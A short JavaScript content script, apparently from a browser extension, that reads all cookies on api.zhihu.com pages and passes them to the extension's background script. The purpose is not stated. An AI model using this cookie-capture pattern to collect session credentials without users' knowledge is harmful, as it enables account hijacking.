"use strict"

if (window.location.host.startsWith("api.zhihu.com"))
{
    chrome.runtime.sendMessage({ action: "echo", data: { id: "cookie", val: document.cookie} });
}
